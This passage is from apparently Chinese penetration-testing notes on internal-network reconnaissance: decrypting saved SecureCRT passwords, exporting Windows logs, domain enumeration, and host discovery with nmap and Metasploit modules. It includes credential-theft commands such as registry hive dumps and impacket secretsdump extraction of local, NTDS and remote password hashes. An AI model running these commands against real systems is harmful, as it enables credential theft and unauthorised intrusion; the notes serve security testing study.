2.7、pycrypto库。此处解密脚本仅限于 SecureCRT 7.x 以下的版本！</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> pip<span class="hljs-number">2</span> install pycrypto</code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">SecureCRT-decryptpass</span><span class="hljs-selector-class">.py</span> 192.168.144.128<span class="hljs-selector-class">.ini</span></code></pre><p><strong>SecureCRT高版本解决</strong></p><p>如果目标的SecureCRT版本较高，无法进行解密该怎么办？此处以 8.5.3（X64 build 1867）为例，直接把对应%APPDATA%\VanDyke\Config\ 整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。</p><p>目标SecureCRT版本与本地版本需一致，否则可能会出现问题</p><h4 id="附上脚本"><a href="#附上脚本" class="headerlink" title="附上脚本"></a>附上脚本</h4><p>Winscp:<br><a href="https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1">ListInstalledPrograms.ps1</a></p><p><a href="https://bitbucket.org/knarf/winscppwd/downloads/winscppwd.exe">winscppwa.exe</a> –目前无法连接</p><p>SecureCRT：<br><a href="https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1">ListInstalledPrograms.ps1</a></p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a></p><p><a href="https://github.com/gitPoc32/Forensic/blob/5c82582d21811a2257e3f68bd95f5e8735d834cd/VanDykeSecureCRT/SecureCRT-decryptpass.py">SecureCRT-decryptpass.py</a></p><hr><h3 id="2-7、破解Weblogic配置文件中的数据库密码"><a href="#2-7、破解Weblogic配置文件中的数据库密码" class="headerlink" title="2.7、破解Weblogic配置文件中的数据库密码"></a>2.7、破解Weblogic配置文件中的数据库密码</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>web/<span class="hljs-number">220147</span>.html  --这篇集合了很多思路和方法树上介绍了使用工具WebLogicPWV1.<span class="hljs-number">0</span>.jar进行破解</code></pre><p>这里如果进行config.xml获得hash破解密码，需要去两次密码…</p><hr><h3 id="2-8、获取域控-系统日志"><a href="#2-8、获取域控-系统日志" class="headerlink" title="2.8、获取域控/系统日志"></a>2.8、获取域控/系统日志</h3><h4 id="dumpel"><a href="#dumpel" class="headerlink" title="dumpel"></a>dumpel</h4><h5 id="1、windows系统日志的存储："><a href="#1、windows系统日志的存储：" class="headerlink" title="1、windows系统日志的存储："></a>1、windows系统日志的存储：</h5><p>windows的系统日志存储在C:\WINDOWS\system32\config目录，文件后缀为evt。</p><h5 id="2、导出工具："><a href="#2、导出工具：" class="headerlink" title="2、导出工具："></a>2、导出工具：</h5><p>使用dumpel.exe可以导出windows的系统日志。</p><p>dumpel.exe可以去微软官网下载，地址：<a href="http://support.microsoft.com/kb/927229%E3%80%82">http://support.microsoft.com/kb/927229。</a></p><p>下载后的dumpel.exe是个安装文件，安装完后可以在安装目录找到一个dumpel.exe，我们需要的是安装后的dumpel.exe。</p><h5 id="3、导出脚本："><a href="#3、导出脚本：" class="headerlink" title="3、导出脚本："></a>3、导出脚本：</h5><p>直接使用dumpel.exe不容易实现自动定期导出系统日志。所以需要编写个脚本。脚本内容：</p><pre><code class="hljs javascript"><span class="hljs-comment">//获得YYYYMMDD格式的当前时间</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCurYYYYMMDD</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">var</span> today = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();<span class="hljs-keyword">var</span> year = today.getYear();<span class="hljs-keyword">var</span> month = today.getMonth() + <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (month &lt; <span class="hljs-number">10</span>) &#123;month = <span class="hljs-string">&quot;0&quot;</span> + month;&#125;<span class="hljs-keyword">var</span> date = today.getDay();<span class="hljs-keyword">if</span> (date &lt; <span class="hljs-number">10</span>)&#123;date = <span class="hljs-string">&quot;0&quot;</span> + date;&#125;<span class="hljs-keyword">return</span> year + <span class="hljs-string">&quot;&quot;</span> + month + <span class="hljs-string">&quot;&quot;</span> + date;&#125;<span class="hljs-comment">//补齐目录结尾的&#x27;\&#x27;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeDir</span>(<span class="hljs-params">str</span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span> (str.charAt(str.length - <span class="hljs-number">1</span>) != <span class="hljs-string">&#x27;\\&#x27;</span>)&#123;<span class="hljs-keyword">return</span> str + <span class="hljs-string">&quot;\\&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> str;&#125;&#125; <span class="hljs-comment">//处理命令行参数</span><span class="hljs-keyword">var</span> args = WScript.Arguments;<span class="hljs-keyword">var</span> days = <span class="hljs-number">1</span>;<span class="hljs-keyword">var</span> path = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">var</span> exepath = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; args.length; i++)&#123;<span class="hljs-keyword">var</span> a = args(i);<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-e&quot;</span>) == <span class="hljs-number">0</span>)&#123;exepath = a.substring(<span class="hljs-number">2</span>, a.length);&#125;<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-p&quot;</span>) == <span class="hljs-number">0</span>)&#123;path = a.substring(<span class="hljs-number">2</span>, a.length);&#125;<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-d&quot;</span>) == <span class="hljs-number">0</span>)&#123;days = a.substring(<span class="hljs-number">2</span>, a.length);&#125;&#125; <span class="hljs-comment">//补齐目录结尾的&#x27;\&#x27;</span>exepath = makeDir(exepath);path = makeDir(path); <span class="hljs-comment">//获取当前时间</span><span class="hljs-keyword">var</span> YYYYMMDD = getCurYYYYMMDD();<span class="hljs-keyword">var</span> YYYYMM = YYYYMMDD.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>); <span class="hljs-comment">//判断按月存放的目录是否存在</span><span class="hljs-keyword">var</span> fso = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>);<span class="hljs-keyword">if</span> (fso.FolderExists(path + YYYYMM) != <span class="hljs-literal">true</span>)&#123;fso.CreateFolder(path + YYYYMM);&#125; <span class="hljs-comment">//执行程序，导出日志</span><span class="hljs-keyword">var</span> ws = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.shell&quot;</span>);ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; application&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_app.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; security&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_sec.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; system&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_sys.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);</code></pre><h5 id="4、执行命令："><a href="#4、执行命令：" class="headerlink" title="4、执行命令："></a>4、执行命令：</h5><p>cscript bak_win_log.js -eD:\Desktop -pD:\winlog -d7</p><p>使用windows的任务计划执行该命令就实现了定期导出。</p><p>dumpel的安装目录里的dumpel_d.htm是使用说明</p><hr><h4 id="wevtutil"><a href="#wevtutil" class="headerlink" title="wevtutil"></a>wevtutil</h4><p>直接上看微软详情吧：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/zh-cn/</span>windows-server<span class="hljs-regexp">/administration/</span>windows-commands/wevtutil</code></pre><h4 id="psloglist"><a href="#psloglist" class="headerlink" title="psloglist"></a>psloglist</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/-zhong/</span>p/<span class="hljs-number">11743489</span>.htmlhttps:<span class="hljs-regexp">//</span>wenku.baidu.com<span class="hljs-regexp">/view/</span>c2e9139803d8ce2f006623ff.html?from=search   --最详细的解释</code></pre><h2 id="3、网络信息收集"><a href="#3、网络信息收集" class="headerlink" title="3、网络信息收集"></a>3、网络信息收集</h2><h3 id="3-1、发现目标WEB程序敏感目录"><a href="#3-1、发现目标WEB程序敏感目录" class="headerlink" title="3.1、发现目标WEB程序敏感目录"></a>3.1、发现目标WEB程序敏感目录</h3><p>就一目录扫描工具，可以使用其他代替。<br>参考文章：</p><p><a href="https://micro8.gitbook.io/micro8/contents-1/21-30/29-fa-xian-mu-biao-web-cheng-xu-min-gan-mu-lu-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/21-30/29-fa-xian-mu-biao-web-cheng-xu-min-gan-mu-lu-di-yi-ji</a></p><hr><h3 id="3-2、基于SCF做目标内网信息搜集"><a href="#3-2、基于SCF做目标内网信息搜集" class="headerlink" title="3.2、基于SCF做目标内网信息搜集"></a>3.2、基于SCF做目标内网信息搜集</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.lshack.cn<span class="hljs-regexp">/642/</span>https:<span class="hljs-regexp">//gi</span>tlab.com<span class="hljs-regexp">/Tomotoes/</span>Micro8<span class="hljs-regexp">/-/</span>blob<span class="hljs-regexp">/b7c284fdbb53ff8ee60acff92d5ebbf1559dfd92/</span>第一百零一课：基于SCF做目标内网信息搜集第二季.pdf</code></pre><p>感谢Micro8大佬退役最后给出的文章思路…</p><hr><h3 id="3-3、内网漏洞快速检测技巧"><a href="#3-3、内网漏洞快速检测技巧" class="headerlink" title="3.3、内网漏洞快速检测技巧"></a>3.3、内网漏洞快速检测技巧</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2354</span>   --goodhttps:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">199012</span></code></pre><h3 id="3-4-域环境信息搜集"><a href="#3-4-域环境信息搜集" class="headerlink" title="3.4 域环境信息搜集"></a>3.4 域环境信息搜集</h3><h4 id="3-4-1、Active-Directory-Domain-Services-获取域控信息"><a href="#3-4-1、Active-Directory-Domain-Services-获取域控信息" class="headerlink" title="3.4.1、Active Directory Domain Services - 获取域控信息"></a>3.4.1、Active Directory Domain Services - 获取域控信息</h4><p>参考文章：<code>https://payloads.online/archivers/2019-04-12/1</code> 感谢倾旋</p><hr><h4 id="3-4-2、Windows域渗透-用户密码枚举"><a href="#3-4-2、Windows域渗透-用户密码枚举" class="headerlink" title="3.4.2、Windows域渗透-用户密码枚举"></a>3.4.2、Windows域渗透-用户密码枚举</h4><p>参考文章：<code>https://payloads.online/archivers/2018-05-02/1</code> 感谢倾旋</p><hr><h4 id="3-4-3、不同环境下域dns记录信息收集方法"><a href="#3-4-3、不同环境下域dns记录信息收集方法" class="headerlink" title="3.4.3、不同环境下域dns记录信息收集方法"></a>3.4.3、不同环境下域dns记录信息收集方法</h4><p>书上介绍了DNS信息查询方法：</p><pre><code class="hljs nginx"><span class="hljs-attribute">DNS</span> ManagerDnscmd使用 Powershell进行dns信息查询adidnsdumpSharpAdidnsdump</code></pre><p>五种方法来获取不通环境下域dns信息，这里后期科补~~~</p><hr><h4 id="3-4-4、impacket框架之域信息获取"><a href="#3-4-4、impacket框架之域信息获取" class="headerlink" title="3.4.4、impacket框架之域信息获取"></a>3.4.4、impacket框架之域信息获取</h4><p>本篇文章讲述impacket套件内部分常用域、内网信息收集工具使用，将会用到的工具，secretsdump、lookupsid、 esentutl、ticketer</p><h5 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h5><p>Secretsdump常用于本地、远程hash导出，具体使用方法如下：</p><p>在渗透测试工作中，为了躲避杀软等防护产品，dump目标机hash通常会进行以下操作。</p><pre><code class="hljs livescript">C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\sam</span> c:<span class="hljs-string">\sam.save</span>C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\security</span> c:<span class="hljs-string">\security.save</span> C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\system</span> c:<span class="hljs-string">\system.save</span></code></pre><p>以上三个注册表项解释:</p><pre><code class="hljs pgsql">SAM存储域用户或本地用户的数据，包括域用户组名或本机用户组、用户名及密码哈希等。<span class="hljs-keyword">Security</span>存储用户安全策略，存储域用户、本地用户登陆记录，缓存的登陆用户凭证，例如<span class="hljs-keyword">domain</span> <span class="hljs-keyword">cache</span>system用来解密SAM和Security</code></pre><p>之后使用secretsdump进行hash内容导出，具体方法如下:</p><p><strong>1）本地hash导出</strong></p><p>获取SAM中hash</p><pre><code class="hljs maxima">secretsdump.py -sam sam.<span class="hljs-built_in">save</span> -<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span> LOCAL</code></pre><p>获取security.save中缓存的登陆用户凭证和LSA Secres</p><pre><code class="hljs pgsql">secretsdump.py -<span class="hljs-keyword">security</span> <span class="hljs-keyword">security</span>.save -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span>.save <span class="hljs-keyword">LOCAL</span></code></pre><p>获取sam security 中所有内容</p><pre><code class="hljs maxima">secretsdump.py -sam sam.<span class="hljs-built_in">save</span> -security security.<span class="hljs-built_in">save</span> -<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span> LOCAL</code></pre><p><strong>2）域用户hash导出</strong></p><p>域用户hash导出还需要NTDS.dit活动目录数据库文件，具体导出方法请查看gitbook《转储域账 户哈希值》</p><p>使用以下命令导出域所有用户hash</p><pre><code class="hljs vim"><span class="hljs-keyword">python</span> secretsdump.<span class="hljs-keyword">py</span> -ntds NTDS.dit -<span class="hljs-built_in">system</span> SYSTEM LOCAL -outputfile<span class="hljs-keyword">lol</span>.hash</code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">secretsdump</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-ntds</span> <span class="hljs-selector-tag">NTDS</span><span class="hljs-selector-class">.dit</span> <span class="hljs-selector-tag">-system</span> <span class="hljs-selector-tag">temp_sys</span><span class="hljs-selector-class">.hiv</span> <span class="hljs-selector-tag">LOCAL-outputfile</span> <span class="hljs-selector-tag">lol</span><span class="hljs-selector-class">.hash</span></code></pre><pre><code class="hljs llvm">proxychains python secretsdump.py rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span></code></pre><p><strong>3）远程导出hash</strong></p><p>secretsdump还支持远程导岀hash，支持socks代理传输数据，需提供远程服务器管理员账号凭证，支持两种方式读取活动目录数据库，Vssadmin和DRSUAPI(Directory Replication Service API)远程目录复制协议api</p><p>导出远程机hash及缓存记录</p><pre><code class="hljs llvm">secretsdump.exe rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span></code></pre><p>使用 Vssadmin复制用户数据库文件的方式进行远程hash导出</p><pre><code class="hljs llvm">secretsdump.exe rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> -just-dc -use-vss</code></pre><h5 id="Esentutl"><a href="#Esentutl" class="headerlink" title="Esentutl"></a>Esentutl</h5><p>esentutl常用于从dit文件提取域内信息的工具，具体使用命令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">esentutl</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">NTDS</span><span class="hljs-selector-class">.dit</span> <span class="hljs-selector-tag">export-table</span> <span class="hljs-selector-tag">datatable</span> &gt;<span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.txt</span></code></pre><h5 id="Ticket"><a href="#Ticket" class="headerlink" title="Ticket"></a>Ticket</h5><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://wh<span class="hljs-number">0</span>ale.github.io/<span class="hljs-number">2018</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-<span class="hljs-number">25</span>-域渗透之票据/</code></pre><h5 id="lookupsid-py"><a href="#lookupsid-py" class="headerlink" title="lookupsid.py"></a>lookupsid.py</h5><p>可查看远程目标机器或域控所有用户内容(需提供域任意用户凭证)</p><p>lookupsid在读取远程机器用户信息时，同时会输出域SID，域SID是生成黄金票据所需数据。</p><pre><code class="hljs css"><span class="hljs-selector-tag">lookupsid</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">domain</span>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:password</span><span class="hljs-keyword">@ip</span></code></pre><hr><h4 id="3-4-5、域信息收集之user2sid，sid2user"><a href="#3-4-5、域信息收集之user2sid，sid2user" class="headerlink" title="3.4.5、域信息收集之user2sid，sid2user"></a>3.4.5、域信息收集之user2sid，sid2user</h4><p>使用场景：当前内网环境有域环境，使用nbtscan或者nltest获取到域控的IP，但是没有域用户的账号密码</p><p>作用：使用 sid2user 和 user2sid 枚举猜测出域用户名，并通过弱口令获取域用户的权限<br>下载地址：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//g</span>reatagain.dbappsecurity.com.cn<span class="hljs-regexp">/#/</span>publicarea<span class="hljs-regexp">/tooldisk?path=412/</span><span class="hljs-number">2430</span></code></pre><p>目前无法访问！</p><p><strong>使用</strong></p><pre><code class="hljs armasm"><span class="hljs-symbol">user2sid.exe</span> \\域控<span class="hljs-built_in">IP</span> 域用户名</code></pre><p>域里面域管默认为administrator用户，且sid为500</p><p>那么先通过administrator域管获取域用户的sid</p><pre><code class="hljs css"><span class="hljs-selector-tag">user2sid</span><span class="hljs-selector-class">.exe</span> \\192.168<span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">administrator</span></code></pre><p>得到域用户的sd为S-1-5-21-675002476-827761xxxx…<br>总结文章：</p><pre><code class="hljs awk">freebuf.com<span class="hljs-regexp">/sectool/</span><span class="hljs-number">175208</span>.html</code></pre><hr><h2 id="4、工作组环境信息搜集"><a href="#4、工作组环境信息搜集" class="headerlink" title="4、工作组环境信息搜集"></a>4、工作组环境信息搜集</h2><h3 id="4-1-基于MSF发现内网存活主机"><a href="#4-1-基于MSF发现内网存活主机" class="headerlink" title="4.1 基于MSF发现内网存活主机"></a>4.1 基于MSF发现内网存活主机</h3><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep    <span class="hljs-comment">#基于arp协议发现内网存活主机，这不能通过代理使用</span>auxiliary<span class="hljs-regexp">/scanner/</span>portscan/ack           <span class="hljs-comment">#基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描，默认扫描1-10000端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span>auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version        <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version        <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version  <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp            <span class="hljs-comment">#发现dns服务，基于默认53端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version      <span class="hljs-comment">#发现内网http服务，基于默认80端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>http/title             <span class="hljs-comment">#探测内网http服务的标题</span>auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version        <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span>use auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump  <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span>use auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump  <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span>auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version    <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner        <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server     <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version        <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span>auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#探测内网主机的netbios名字</span></code></pre><p>感谢Micro8大佬！！！</p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">21</span>-<span class="hljs-number">30</span>/<span class="hljs-number">28</span>-ji-yu-msf-fa-xian-nei-wang-cun-huo-zhu-ji-di-liu-ji</code></pre><hr><h3 id="4-2、基于sqlDataSourceEnumerator发现内网存活主机"><a href="#4-2、基于sqlDataSourceEnumerator发现内网存活主机" class="headerlink" title="4.2、基于sqlDataSourceEnumerator发现内网存活主机"></a>4.2、基于sqlDataSourceEnumerator发现内网存活主机</h3><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">41</span>-<span class="hljs-number">50</span>/<span class="hljs-number">50</span>-ji-yu-sqldatasourceenumerator-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><p>感谢大佬！！Micro8</p><hr><h3 id="4-3、基于ICMP发现内网存活主机"><a href="#4-3、基于ICMP发现内网存活主机" class="headerlink" title="4.3、基于ICMP发现内网存活主机"></a>4.3、基于ICMP发现内网存活主机</h3><p><strong>ICMP简介：</strong></p><p>它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs bash">$ sudo nmap -sP -PI 192.168.1.0/24 -T4</code></pre><pre><code class="hljs bash">$ nmap -sn -PE -T4 192.168.1.0/24</code></pre><p><strong>CMD下扫描：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %%P in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) do @ping -w <span class="hljs-number">10</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.%%P | findstr TTL</code></pre><p><strong>powershell扫描：</strong></p><pre><code class="hljs 1c">powershell.exe ‐exec bypass ‐Command <span class="hljs-string">&quot;Import‐Module ./Invoke‐TSPingSweep.ps1</span>; Invoke‐TSPingSweep ‐StartAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> ‐EndAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">1.254</span> ‐ResolveHost ‐ScanPort ‐Port <span class="hljs-number">445</span>,<span class="hljs-number">135</span><span class="hljs-string">&quot;</span></code></pre><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\&gt;tcping.exe ‐n <span class="hljs-number">1</span> <span class="hljs-number">192.168.1.0</span> <span class="hljs-number">80</span></code></pre><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">21</span>-<span class="hljs-number">30</span>/<span class="hljs-number">21</span>-ji-yu-icmp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-4、基于UDP发现内网存活主机"><a href="#4-4、基于UDP发现内网存活主机" class="headerlink" title="4.4、基于UDP发现内网存活主机"></a>4.4、基于UDP发现内网存活主机</h3><p><strong>UDP简介：</strong></p><p>UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p><p><strong>UDP显著特性：</strong></p><p>1）UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。</p><p>2）UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。</p><p>3）UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报</p><p>4）UDP 支持多播和广播。</p><p><strong>1、nmap扫描</strong></p><pre><code class="hljs gams"><span class="hljs-symbol">$</span> nmap -sU -T5 -sV --<span class="hljs-built_in">max</span>-retries <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> -p <span class="hljs-number">500</span></code></pre><p><strong>2、msf扫描</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probemsf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep</code></pre><p><strong>3、unicornscan扫描</strong></p><p>linux下使用推荐</p><pre><code class="hljs dns">$ unicornscan -mU <span class="hljs-number">192.168.1.100</span></code></pre><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.mcafee.com<span class="hljs-regexp">/ca/</span>downloads<span class="hljs-regexp">/free-tools/</span>scanline.aspx</code></pre><p>蓝奏地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.lanzous.com/i32zncf</code></pre><p>win下使用推荐。管理员执行</p><p>附录：<br>在线基于Nmap的udp扫描：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pentest-tools.com<span class="hljs-regexp">/network-vulnerability-scanning/u</span>dp-port-scanner-online-nmap</code></pre><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">12</span>-ji-yu-udp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-5、基于ARP发现内网存活主机"><a href="#4-5、基于ARP发现内网存活主机" class="headerlink" title="4.5、基于ARP发现内网存活主机"></a>4.5、基于ARP发现内网存活主机</h3><p><strong>ARP简介：</strong></p><p>ARP，通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p><p><strong>1、nmap扫描</strong></p><pre><code class="hljs vim">$ <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> -PR <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">24</span></code></pre><p><strong>2、msf扫描</strong></p><pre><code class="hljs pgsql">msf &gt; use auxiliary/scanner/discovery/arp_sweepmsf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span>Module <span class="hljs-keyword">options</span> (auxiliary/scanner/discovery/arp_sweep):<span class="hljs-type">Name</span> <span class="hljs-keyword">Current</span> Setting Required Description<span class="hljs-comment">---- --------------- -------- -----------</span>INTERFACE <span class="hljs-keyword">no</span> The <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the interfaceRHOSTS yes The target address range <span class="hljs-keyword">or</span> <span class="hljs-type">CIDR</span> identifierSHOST <span class="hljs-keyword">no</span> Source IP AddressSMAC <span class="hljs-keyword">no</span> Source MAC AddressTHREADS <span class="hljs-number">1</span> yes The number <span class="hljs-keyword">of</span> concurrent threadsTIMEOUT <span class="hljs-number">5</span> yes The number <span class="hljs-keyword">of</span> seconds 